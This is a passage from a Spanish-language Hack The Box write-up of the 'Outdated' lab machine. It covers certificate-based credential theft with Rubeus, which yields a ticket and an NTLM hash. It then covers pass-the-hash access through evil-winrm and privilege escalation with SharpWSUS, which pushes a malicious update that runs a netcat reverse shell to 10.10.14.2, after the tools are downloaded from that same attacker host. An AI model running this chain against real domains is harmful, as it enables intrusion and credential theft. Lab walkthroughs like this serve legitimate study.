lCMz5eFCgE7Tw3lsCAQEm1WAnSRtDx1bDPa6cimH/p9Fc8sHLtG8MathANxRor8ZIV+EYrTTFp+Z1pIKnEWZw1mx19wXlk89hKHdmDdnnnfWYC01SjwnETzDbEs6ElEeEHz1lz+HpHGZ9+wsQd2pbvHW9bkEpve19oKppcONAtpJXoxD2fq+Sdabq8+6QBdFmIteokrx055DWpOJp
/ZRMzuIGujCrjiry3CdiEJS++Cgv8sD5d1/it2LoDCzzSDD1fvr+lYdlQpRid4v7g7hedjVwbtuL2xfY6enB+ABl2mM+DRHSPUpASoZ9sUpuQZhzzaP3O6FHDCFA4oC1/g/jOxsf0lk0MY1XS+JNYQWQhlyxbTU9Eq6nWc5R+oHH+RWqD8SaMKHyZM9Qfx8N6LMLVZWcQjGB6TATB
gkqhkiG9w0BCRUxBgQEAQAAADBXBgkqhkiG9w0BCRQxSh5IADUAZQA3ADkAYgBlADEAYwAtADYANwA3ADMALQA0ADUAMgBiAC0AYgA2ADcAMAAtAGQAMgBhADMAOQA3ADgAYwBmADMANgA0MHkGCSsGAQQBgjcRATFsHmoATQBpAGMAcgBvAHMAbwBmAHQAIABFAG4AaABhAG4AYw
BlAGQAIABSAFMAQQAgAGEAbgBkACAAQQBFAFMAIABDAHIAeQBwAHQAbwBnAHIAYQBwAGgAaQBjACAAUAByAG8AdgBpAGQAZQByMIIDPwYJKoZIhvcNAQcGoIIDMDCCAywCAQAwggMlBgkqhkiG9w0BBwEwHAYKKoZIhvcNAQwBAzAOBAiwL3QxtGYx0wICB9CAggL4gwUYu7ko7L9
e1TopG2/vBtBWn+vXD3eB7XdbLtQctO8NqCN0Mfm6vKiUSp/GkbMBlE4uYzERoQfNjBFIc5cMGJM84lXS7+eRwpu+JMdRT6TU9cwpkv0yKUiUK3UtBaLY4i4aPvA/Y+9EBcVCnFhvlBfH+2OJHMbtbpX/RkvxBk0IfRbzjkocxciXyeSq+CS5xZ81ZwWfkX2B3sK06yXZaUM0ak2m
Qeum+sB2mu5dS7MyeGimYk5NpfOF/BhIW4Gx8uWKS1wz5NO6xJnz00Arc1lS9+DXQD+1aOHfAgCJzxzde9OhMAocp1RMRwZZi0/PosO+O8eUhnnTVL3jPWoJvu7xfmaG6YS9tfmtfdHXRk2GuwcpvY7qhMuPuwsLBCT1DBuSFWZ2FrSYz2oJiZ4tmV1cnCL0OD/p/GvHa8kJzwYVe
dLgAVB4yx/X9DiAiaprEVTHYg0GvVx0o6fkhzxoltQ3cVckdLEqSMtnABk3LbxCk68K8yWb8lLZq+9NQcUiMvDplDENVOhkuA8qk5SOBWuIsHZojVkt4RE1B5EorseE4RrEwZ6B7RfymvbwDYc59VhXy/vErCsAoka2zdH00zG6d/9nAYhMf/PtvAjxNC/RrB6gDnAQ5qoi9gmSN9
2OHYDvXWRVoaRsCVc4fhAl9dg/5tSZQoiP2w83GMZieI/igLXGjP7i5G1lEe2fsIAhrCs31bC9Kf561lNwPFKuE/OMb4DdkktWUoCfJx//WCHNabo3cC+zPDjZhktnlRLvYEbfJ34GNqf7jreYii1YnPCGcwYZ5RglMtsl/ZP4tVx28zn4Gd8VMet/NQc91xMypYcL1FX2K/tIzMZ
28OlvreBy+P6z8MzMBYCSRyxQAuXCBtQc8YlCetTmV7b/7nNkd794ePQhRqSf1FDU7A/T5EgerxBEh6sS9ceguhISfbV5kAlshFGvpX6CqT5EyLbpZn3Gd0jsH0x8Jp9fAY1px4yPvIChz3uucA9lk6IHXilwBetSXqPkVDA7MB8wBwYFKw4DAhoEFPkrB6ntGJfAi/a1bYFK81iY
A0reBBTdtrNjySiJi3pk0oLO7U+BaY5Z0AICB9A= /password:"LyqIj3z2DRpHGRAT" /domain:outdated.htb /dc:DC.outdated.htb /getcredentials /show

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/ 

  v2.2.0

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=sflowers 
[*] Building AS-REQ (w/ PKINIT preauth) for: 'outdated.htb\sflowers'
[*] Using domain controller: 172.16.20.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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

  ServiceName              :  krbtgt/outdated.htb
  ServiceRealm             :  OUTDATED.HTB
  UserName                 :  sflowers
  UserRealm                :  OUTDATED.HTB
  StartTime                :  1/17/2023 4:09:10 PM
  EndTime                  :  1/18/2023 2:09:10 AM
  RenewTill                :  1/24/2023 4:09:10 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  8y9LZ40qSnVbhDfW7SsIdA==
  ASREP (key)              :  937EF05AA16C6AA396BFCE4E45907F84

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : 1FCDB1F6015DCB318CC77BB2BDA14DB5
```

Valido si el Usuario SFlowers pertenece al grupo Remote Management Users para conectarme con evil-winrm

```null
PS C:\Temp> net user sflowers /domain
The request will be processed at a domain controller for domain outdated.htb.

User name                    sflowers
Full Name                    Susan Flowers       
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            6/20/2022 10:04:09 AM
Password expires             Never
Password changeable          6/21/2022 10:04:09 AM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   1/17/2023 4:09:10 PM 

Logon hours allowed          All

Local Group Memberships      *Remote Management Use*WSUS Administrators  
Global Group memberships     *Domain Users
The command completed successfully.
```

Efectivamente, pertenece y además tiene asignado otro grupo más inusual que me va a permitir escalar privilegios a Domain Admin

Me conecto como ese usuario a la máquina víctima

```null
evil-winrm -u 'sflowers' -H '1FCDB1F6015DCB318CC77BB2BDA14DB5' -i 10.10.11.175

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\sflowers\Documents> ipconfig

Windows IP Configuration


Ethernet adapter vEthernet (vSwitch):

   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 172.16.20.1
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 0.0.0.0

Ethernet adapter Ethernet0 3:

   Connection-specific DNS Suffix  . : htb
   IPv6 Address. . . . . . . . . . . : dead:beef::246
   IPv6 Address. . . . . . . . . . . : dead:beef::29b5:d8cc:891a:448a
   Link-local IPv6 Address . . . . . : fe80::29b5:d8cc:891a:448a%15
   IPv4 Address. . . . . . . . . . . : 10.10.11.175
   Subnet Mask . . . . . . . . . . . : 255.255.254.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:b080%15
                                       10.10.10.2
*Evil-WinRM* PS C:\Users\sflowers\Documents> hostname
DC
```

Ahora ya no estoy en un contenedor si no directamente en el DC

Se puede visualizar la primera flag

```null
*Evil-WinRM* PS C:\Users\sflowers\Desktop> type user.txt
aa32f95ba6469ca8af48ef76587073dd
```

# Escalada

Buscando por exploits hacia el grupo WSUS Administrator, se puede ver que es posible realizar un Man-in-the-Middle en el que se envene el tráfico http (no cifrado), para así poder instalar otros recursos no intencionados y escalar privilegios.

Este es el [POC](https://labs.nettitude.com/blog/introducing-sharpwsus/)

Hay que compilar el proyecto de github con Visual Studio en una máquina windows y posteriormente pasarlo a una linux para subirlo a la máquina víctima

Para compilarlo, simplemente hay que abrir el proyecto y darle a iniciar

<img src="/writeups/assets/img/Outdated-htb/5.png" alt="">

<img src="/writeups/assets/img/Outdated-htb/6.png" alt="">

Además de este binario hay que subir un release de psexec para poder impersonar al usuario y ejecutar comandos

Hay que descargarlo desde la web oficial de Microsoft

<img src="/writeups/assets/img/Outdated-htb/7.png" alt="">

Finalmente lo que hay que subir es lo siguiente:

```null
*Evil-WinRM* PS C:\Users\sflowers\Desktop> iwr -uri http://10.10.14.2/SharpWSUS.exe -o SharpWSUS.exe
*Evil-WinRM* PS C:\Users\sflowers\Desktop> iwr -uri http://10.10.14.2/PsExec64.exe -o PsExec64.exe
*Evil-WinRM* PS C:\Users\sflowers\Desktop> iwr -uri http://10.10.14.2/nc.exe -o nc.exe
```

## Reverse Shell

Para ganar acceso al sistema se puede de la siguiente manera

```null
*Evil-WinRM* PS C:\Windows\Temp\Privesc> .\SharpWSUS.exe create /payload:"C:\Windows\Temp\Privesc\PsExec64.exe" /args:"-accepteula -s -d cmd.exe /c C:\\Windows\Temp\Privesc\\nc.exe -e cmd 10.10.14.2 443" /title:"ReverseShell"
Para desplagarlo, te indica el comando que hay que ejecutar

```null
.\SharpWSUS.exe approve /updateid:484cd413-cd7f-41a8-86e6-c0f5e662f424 /computername:DC.outdated.htb /groupname:"ReverseShell"
```

Finalmente, gano acceso a la máquina con máximos privilegios y puedo ver la segunda flag

```null
nc -nlvp 443
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.11.175.
Ncat: Connection from 10.10.11.175:58523.
Microsoft Windows [Version 10.0.17763.1432]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

```

```null
C:\Users\Administrator\Desktop>type root.txt
type root.txt
d514a5b983c75de98d6649f6eed1c91f
```
